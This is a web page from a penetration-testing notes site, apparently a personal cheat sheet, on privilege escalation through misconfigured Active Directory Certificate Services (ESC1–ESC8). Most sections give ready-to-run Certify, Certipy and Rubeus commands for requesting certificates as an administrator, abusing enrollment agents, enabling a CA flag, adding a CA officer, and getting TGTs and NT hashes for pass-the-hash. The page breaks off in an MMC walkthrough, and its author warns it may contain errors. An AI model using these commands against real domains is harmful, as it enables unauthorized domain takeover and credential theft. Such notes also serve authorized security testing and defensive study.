<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Windows PrivEsc with AD CS - readloud.org</title>
    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Windows PrivEsc with AD CS", url: "#_top", children: [
              {title: "Enumerate Certificate Templates", url: "#enumerate-certificate-templates" },
              {title: "ESC1", url: "#esc1" },
              {title: "ESC2", url: "#esc2" },
              {title: "ESC3", url: "#esc3" },
              {title: "ESC4", url: "#esc4" },
              {title: "ESC6", url: "#esc6" },
              {title: "ESC7", url: "#esc7" },
              {title: "ESC8", url: "#esc8" },
              {title: "Privilege Escalation with Microsoft Management Console (MMC)", url: "#privilege-escalation-with-microsoft-management-console-mmc" },
              {title: "Add Computer and PrivEsc", url: "#add-computer-and-privesc" },
          ]},
        ];

    </script>
    <script src="../../../../js/base.js"></script>
      <script src="../../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="windows-privesc-with-ad-cs">Windows PrivEsc with AD CS</h1>
<p>We may be able to compromise Active Directory with vulnerable AD CS configurations or templates.</p>
<div class="language-text highlight"><pre><span></span><code>- [domain-escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
- [ms-crtd](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1)
- [certified-pre-owned-d95910965cd2](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- [exploiting-ad-cs-a-quick-look-at-esc1-esc8](https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8)
</code></pre></div>
<p>‚ö†Ô∏è<strong>DISCLAIMER: I still don't really understand AD CS, so it might be wrong. If so, please let me know via GitHub Issue or Pull Request.</strong></p>
<h2 id="enumerate-certificate-templates">Enumerate Certificate Templates</h2>
<p>Certificate templates are the rule set for AD CS. It contains CA name, CA permissions, etc. Some attributes are related to vulnerabilities to privilege escalation.<br />
To enumerate them, we can use <code>Certify</code> or <code>Certipy</code>.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>certipy<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span>user@example.local<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;target-ip&gt;<span class="w"> </span>-stdout
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>certipy<span class="w"> </span>find<span class="w"> </span>-vulnerable<span class="w"> </span>-u<span class="w"> </span>user@example.local<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;target-ip&gt;<span class="w"> </span>-stdout
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Certify.exe<span class="w"> </span>find<span class="w"> </span>/vulnerable
</span></code></pre></div>
<p><br /></p>
<h2 id="esc1">ESC1</h2>
<h3 id="requirements-to-attack">Requirements to Attack</h3>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Value</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>msPKI-Certificate-Name-Flag</td>
<td>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (<code>0x00000001</code>)</td>
<td>If the flag is present, a requester can specify the SAN(Subject Alternative Name).</td>
</tr>
<tr>
<td>msPKI-enrollment-flag</td>
<td>None</td>
<td></td>
</tr>
<tr>
<td>Authorized Signature Required</td>
<td>0</td>
<td>It's not required.</td>
</tr>
<tr>
<td>pKIExtendedKeyUsage</td>
<td>Client Authentication, PKINIT Client Authentication, Smart Card Login, Any Purpose, or no EKU (SubCA)</td>
<td></td>
</tr>
<tr>
<td>Enrollment Permissions</td>
<td>Low-level domain users such as Authenticated Users</td>
<td>Low-priivileged users can request a certificate with the template.</td>
</tr>
<tr>
<td>Manager approval</td>
<td>Disabled</td>
<td></td>
</tr>
</tbody>
</table>
<h3 id="exploit">Exploit</h3>
<p>Reference: <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#abuse">HackTricks</a></p>
<p>Request the certificate specifying the <code>altname</code> as a Domain Admin such as <code>localadmin</code> then impersonate an administrator.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Certify.exe<span class="w"> </span>request<span class="w"> </span>/ca:dc.example.local<span class="se">\V</span>ULN-CA<span class="w"> </span>/template:VulnTemplate<span class="w"> </span>/altname:localadmin
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>certipy<span class="w"> </span>req<span class="w"> </span><span class="s1">&#39;example.local/username:password@ca.example.local&#39;</span><span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;VULN-CA&#39;</span><span class="w"> </span>-template<span class="w"> </span><span class="s1">&#39;VulnTemplate&#39;</span><span class="w"> </span>-upn<span class="w"> </span><span class="s1">&#39;administrator@example.local&#39;</span>
</span></code></pre></div>
<p>Then transform <code>.pem</code> to <code>.pfx</code> using <code>openssl</code>.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Copy the content of the PEM then paste it to the cert.pem using editor.</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>nano<span class="w"> </span>cert.pem
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c1"># Convert PEM to PFX</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>openssl<span class="w"> </span>pkcs12<span class="w"> </span>-in<span class="w"> </span>cert.pem<span class="w"> </span>-keyex<span class="w"> </span>-CSP<span class="w"> </span><span class="s2">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span><span class="w"> </span>-export<span class="w"> </span>-out<span class="w"> </span>cert.pfx
</span></code></pre></div>
<p>After that we can request TGT using <code>Rubeus</code>.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:localadmin<span class="w"> </span>/certificate:cert.pfx<span class="w"> </span>/password:Password123!<span class="w"> </span>/ptt
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c1"># if you gave the password for &quot;cert.pfx&quot;, you need to specify the password</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:Administrator<span class="w"> </span>/password:password123<span class="w"> </span>/certificate:cert.pfx<span class="w"> </span>/ptt
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># or output the file</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:Administrator<span class="w"> </span>/certificate:&lt;Thumbprint&gt;<span class="w"> </span>/outfile:ticket.kirbi
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>certipy<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-username<span class="w"> </span>administrator<span class="w"> </span>-domain<span class="w"> </span>example.local<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;target-ip&gt;
</span></code></pre></div>
<p>If you get the error like "Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)", sync the time with AD server.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>sudo<span class="w"> </span>rdate<span class="w"> </span>-n<span class="w"> </span>&lt;target-ip&gt;
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="c1"># or</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>ntpdate<span class="w"> </span>&lt;target-ip&gt;
</span></code></pre></div>
<p>Now we get the NT hash so we can login the target machine using this hash by <strong>Pass-The-Hash</strong>.<br />
Or if we outputs as <code>.kirbi</code>, crack it by <code>john</code>.</p>
<ul>
<li><strong>Crack TGT</strong></li>
</ul>
<p>Please see <a href="/exploit/cryptography/algorithm/kerberos-tgt-cracking">Kerberos TGT Cracking</a>.</p>
<ul>
<li><strong>Pass-The-Ticket</strong></li>
</ul>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>impacket-ticketConverter<span class="w"> </span>ticket.kirbi<span class="w"> </span>ticke.ccache
</span></code></pre></div>
<p><br /></p>
<h2 id="esc2">ESC2</h2>
<h3 id="requirements-to-attack_1">Requirements to Attack</h3>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Value</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>msPKI-Certificate-Name-Flag</td>
<td>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (<code>0x00000001</code>)</td>
<td>If the flag is present, a requester can specify the SAN(Subject Alternative Name).</td>
</tr>
<tr>
<td>msPKI-enrollment-flag</td>
<td>None</td>
<td></td>
</tr>
<tr>
<td>Authorized Signature Required</td>
<td>0</td>
<td>It's not required.</td>
</tr>
<tr>
<td>pKIExtendedKeyUsage</td>
<td>Any Purpose EKUs or no EKU (SubCA)</td>
<td></td>
</tr>
<tr>
<td>Enrollment Permissions</td>
<td>Low-level domain users such as Authenticated Users</td>
<td>Low-priivileged users can request a certificate with the template.</td>
</tr>
<tr>
<td>Manager approval</td>
<td>Disabled</td>
<td></td>
</tr>
</tbody>
</table>
<h3 id="exploit_1">Exploit</h3>
<p>The following LDAP query when run against the AD Forest‚Äôs configuration schema can be
used to enumerate templates matching this scenario.</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c"># 1.2.840.113556.1.4.804: LDAP_MATCHING_RULE_BIT_OR</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="c"># 2.5.29.37.0: Any Purpose EKU</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="p">(&amp;(</span><span class="n">objectclass</span><span class="p">=</span><span class="n">pkicertificatetemplate</span><span class="p">)(!(</span><span class="n">mspki-enrollment-flag</span><span class="p">:</span><span class="n">1</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">840</span><span class="p">.</span><span class="n">113556</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">4</span><span class="p">.</span><span class="n">804</span><span class="p">:=</span><span class="n">2</span><span class="p">))(|(</span><span class="n">mspki-ra-signature</span><span class="p">=</span><span class="n">0</span><span class="p">)(!(</span><span class="n">mspki-ra-signature</span><span class="p">=*)))(|(</span><span class="n">pkiextendedkeyusage</span><span class="p">=</span><span class="n">2</span><span class="p">.</span><span class="n">5</span><span class="p">.</span><span class="n">29</span><span class="p">.</span><span class="n">37</span><span class="p">.</span><span class="n">0</span><span class="p">)(!(</span><span class="n">pkiextendedkeyusage</span><span class="p">=*))))</span>
</span></code></pre></div>
<p><br /></p>
<h2 id="esc3">ESC3</h2>
<p>To abuse this for privilege escalation, a CAs requires at least two templates conditions.</p>
<h3 id="requirements-to-attack-condition-1">Requirements to Attack (Condition 1)</h3>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Value</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Authorized Signature Required</td>
<td>0</td>
<td>It's not required.</td>
</tr>
<tr>
<td>pKIExtendedKeyUsage</td>
<td>Certificate Request Agent EKU</td>
<td>The Certificate Request Agent OID (<code>1.3.6.1.4.1.311.20.2.1</code>), known as <strong>Enrollment Agent</strong>, allows for requesting other certificate templates on behalf of other principals.</td>
</tr>
<tr>
<td>Enrollment Permissions</td>
<td>Low-level domain users such as Authenticated Users</td>
<td>Low-priivileged users can request a certificate with the template.</td>
</tr>
<tr>
<td>Enrollment Agent Restrictions</td>
<td>Not implemented</td>
<td></td>
</tr>
<tr>
<td>Manager approval</td>
<td>Disabled</td>
<td></td>
</tr>
</tbody>
</table>
<h3 id="requirements-to-attack-condition-2">Requirements to Attack (Condition 2)</h3>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Value</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Authorized Signature Required</td>
<td>1</td>
<td>It's required.</td>
</tr>
<tr>
<td>Schema Version</td>
<td><code>1</code> or is greater than <code>2</code></td>
<td></td>
</tr>
<tr>
<td>Application Policies</td>
<td>Certificate Request Agent EKU</td>
<td></td>
</tr>
<tr>
<td>pKIExtendedKeyUsage</td>
<td>Certificate Request Agent EKU</td>
<td>Client Authentication</td>
</tr>
<tr>
<td>Enrollment Permissions</td>
<td>Low-level domain users such as Authenticated Users</td>
<td>Low-priivileged users can request a certificate with the template.</td>
</tr>
<tr>
<td>Enrollment Agent Restrictions</td>
<td>Not implemented</td>
<td></td>
</tr>
<tr>
<td>Manager approval</td>
<td>Disabled</td>
<td></td>
</tr>
</tbody>
</table>
<h3 id="exploit_2">Exploit</h3>
<p>We can request an enrollment agent certificate (Condition 1).</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Certify.exe<span class="w"> </span>request<span class="w"> </span>/ca:dc.example.local<span class="se">\V</span>ULN-CA<span class="w"> </span>/template:VulnTemplate
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>certipy<span class="w"> </span>req<span class="w"> </span><span class="s1">&#39;example.local/username:password@ca.example.local -ca &#39;</span>VULN-CA<span class="err">&#39;</span><span class="w"> </span>-template<span class="w"> </span>VulnTemplate
</span></code></pre></div>
<p>Then issue a certificate request on behalf of another to a template that allows for domain authentication (Condition 2).</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Certify.exe<span class="w"> </span>request<span class="w"> </span>/ca:dc.example.local<span class="se">\V</span>ULN-CA<span class="w"> </span>/template:User<span class="w"> </span>/onbehalfof:example<span class="se">\i</span>tadmin<span class="w"> </span>/enrollcert:enrollmentAgentCert.pfx<span class="w"> </span>/enrollcertpw:asdf
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>certipy<span class="w"> </span>req<span class="w"> </span><span class="s1">&#39;example.local/username:password@ca.example.local&#39;</span><span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;VULN-CA&#39;</span><span class="w"> </span>-template<span class="w"> </span><span class="s1">&#39;User&#39;</span><span class="w"> </span>-on-behalf-of<span class="w"> </span><span class="s1">&#39;example\administrator&#39;</span><span class="w"> </span>-pfx<span class="w"> </span><span class="s1">&#39;cert.pfx&#39;</span>
</span></code></pre></div>
<p>Ask TGT to authenticate as the "On Behalf Of" user.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:example<span class="se">\i</span>tadmin<span class="w"> </span>/certificate:itadminFromEnrollmentAgent.pfx<span class="w"> </span>/password:asdf
</span></code></pre></div>
<p><br /></p>
<h2 id="esc4">ESC4</h2>
<h3 id="requirements-to-attack_2">Requirements to Attack</h3>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Value</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Access Control rights</td>
<td>Users have <code>Full Control</code> or <code>Write</code> permission.</td>
<td></td>
</tr>
<tr>
<td>Object Control Permissions</td>
<td>Users have <code>Owner</code>, <code>FullControl</code>, <code>WriteOwner</code>, <code>WriteDacl</code> or <code>WriteProperty</code> permission.</td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="esc6">ESC6</h2>
<h3 id="requirements-to-attack_3">Requirements to Attack</h3>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Value</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>EDITF_ATTRIBUTESUBJECTALTNAME2 flag</td>
<td>Enabled</td>
<td>If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the SAN (subject alternative name.)</td>
</tr>
</tbody>
</table>
<h3 id="exploit_3">Exploit</h3>
<p>First off, check if the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag is set on the CA.</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">certutil</span> <span class="err">‚Äì</span><span class="n">getreg</span> <span class="n">policy</span><span class="p">\</span><span class="n">EditFlags</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">reg</span> <span class="n">query</span> <span class="p">\\&lt;</span><span class="n">target-ip</span><span class="p">&gt;\</span><span class="n">HKEY_LOCAL_MACHINE_SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\</span><span class="n">CertSvc</span><span class="p">\</span><span class="n">Configuration</span><span class="p">\&lt;</span><span class="n">VULN-CA</span><span class="p">&gt;\</span><span class="n">PolicyModules</span><span class="p">\</span><span class="n">CertificateAuthority_MicrosoftDefault</span><span class="p">.</span><span class="n">Policy</span><span class="p">\</span> <span class="p">/</span><span class="n">v</span> <span class="n">EditFlags</span>
</span></code></pre></div>
<p>If set, abuse it by using <code>/altname</code> flag with any template (e.g. <code>User</code>) that allows for domain auth.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Certify.exe<span class="w"> </span>request<span class="w"> </span>/ca:dc.example.local<span class="se">\V</span>ULN-CA<span class="w"> </span>/template:User<span class="w"> </span>/altname:localadmin
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>certutil<span class="w"> </span>-config<span class="w"> </span><span class="s2">&quot;VULN-CA-HOST\VULN-CA&quot;</span><span class="w"> </span>-setreg<span class="w"> </span>policy<span class="se">\E</span>ditFlags<span class="w"> </span>+EDITF_ATTRIBUTESUBJECTALTNAME2
</span></code></pre></div>
<p><br /></p>
<h2 id="esc7">ESC7</h2>
<h3 id="requirements-to-attack_4">Requirements to Attack</h3>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Value</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>CA Permissions</td>
<td>Low-privileged users have <code>ManageCA</code> (aka CA Administrator) permissions or <code>ManageCertificates</code> (aka Certificate Manager/Officer).</td>
<td>The <code>ManageCA</code> permission grants a principal the ability to perform "Administrative" CA actions, including the modification of persistent configuration data. This includes the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag.</td>
</tr>
</tbody>
</table>
<h3 id="exploit_4">Exploit</h3>
<p>At first we need to know the <code>CA Name</code> so run the following command then check the output.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>certipy<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span>username@example.local<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;target-ip&gt;<span class="w"> </span>-stdout
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="c1"># Also it can be used.</span>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>Get-CertificationAuthority<span class="w"> </span>-ComputerName<span class="w"> </span>dc.example.local<span class="w"> </span><span class="p">|</span><span class="w"> </span>Get-CertificationAuthorityAcl<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="k">select</span><span class="w"> </span>-expand<span class="w"> </span>Access
</span></code></pre></div>
<p>Then add new officer to the CA.  Replace <code>victim-ca</code> with actual name found.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># -add-officer: Add a new officer to specific CA (specified with `-ca`)</span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="c1"># -ca: Specify the CA Name</span>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>certipy<span class="w"> </span>ca<span class="w"> </span>-u<span class="w"> </span>username@example.local<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;target-ip&gt;<span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;victim-ca&#39;</span><span class="w"> </span>-add-officer<span class="w"> </span>username
</span></code></pre></div>
<p>Next, enable the template on the CA.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>certipy<span class="w"> </span>ca<span class="w"> </span>-u<span class="w"> </span>username@example.local<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;target-ip&gt;<span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;victim-ca&#39;</span><span class="w"> </span>-enable-template<span class="w"> </span><span class="s1">&#39;SubCA&#39;</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="c1"># Check if the template enabled successfully</span>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>certipy<span class="w"> </span>ca<span class="w"> </span>-u<span class="w"> </span>username@example.local<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;target-ip&gt;<span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;victim-ca&#39;</span><span class="w"> </span>-list-template
</span></code></pre></div>
<p>Request the certificate for the template such as <code>SubCA</code>.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># -upn: Alternative UPN</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>certipy<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>username@example.local<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;target-ip&gt;<span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;victim-ca&#39;</span><span class="w"> </span>-template<span class="w"> </span><span class="s1">&#39;SubCA&#39;</span><span class="w"> </span>-upn<span class="w"> </span>administrator@example.local<span class="w"> </span>-target<span class="w"> </span>example.local
</span></code></pre></div>
<p>If failed, we can issue the request with the request ID.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>certipy<span class="w"> </span>ca<span class="w"> </span>-u<span class="w"> </span>username@example.local<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;target-ip&gt;<span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;victim-ca&#39;</span><span class="w"> </span>-issue-request<span class="w"> </span>&lt;request-id&gt;
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>certipy<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>username@example.local<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;target-ip&gt;<span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;victim-ca&#39;</span><span class="w"> </span>-target<span class="w"> </span>example.local<span class="w"> </span>-retrieve<span class="w"> </span>&lt;request-id&gt;
</span></code></pre></div>
<p>Now we have <code>administrator.pfx</code>. Using this, we can retrieve the hash.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>certipy<span class="w"> </span>ca<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;target-ip&gt;<span class="w"> </span>-domain<span class="w"> </span>example.local<span class="w"> </span>-username<span class="w"> </span>administrator
</span></code></pre></div>
<p>Crack the hash and get the administrator‚Äôs password or execute pass-the-hash attack.</p>
<p><br /></p>
<h2 id="esc8">ESC8</h2>
<p>AD CS supports several HTTP-based enrollment methods via additional AD CS server roles that administrators can install. These HTTP-based certificate enrollement interfaces are all vulnerable NTLM relay attacks.</p>
<h3 id="exploit_5">Exploit</h3>
<p>Enumerate enabled HTTP AD CS endpoints with <code>Certify</code>.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>Certify.exe<span class="w"> </span>cas
</span></code></pre></div>
<p>To parse and list the CES endpoints in their AD object in the <code>msPKI-Enrollment-Servers</code>, execute the following command.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>certutil<span class="w"> </span>-enrollmentServerURL<span class="w"> </span>-config<span class="w"> </span>DC.EXAMPLE.LOCAL<span class="se">\V</span>ULN-CA
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>Import-Module<span class="w"> </span>PSPKI
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>Get-CertificationAuthority<span class="w"> </span><span class="p">|</span><span class="w"> </span>Select<span class="w"> </span>Name,Enroll*<span class="w"> </span><span class="p">|</span><span class="w"> </span>Format-List<span class="w"> </span>*
</span></code></pre></div>
<p><br /></p>
<h2 id="privilege-escalation-with-microsoft-management-console-mmc">Privilege Escalation with Microsoft Management Console (MMC)</h2>
<p>If we find the template which contains vulnerable parameters, we can create a new certificate using the template and can gain access to the Administrator's account.<br />
There are some method to create the new one. However, this section provides the easiest way using MMC.  </p>
<h3 id="1-request-a-new-malicious-certificate-with-mmc">1. Request a New ‚ÄúMalicious‚Äù Certificate with MMC</h3>
<ol>
<li>Right-click on the Windows icon, and select Run.</li>
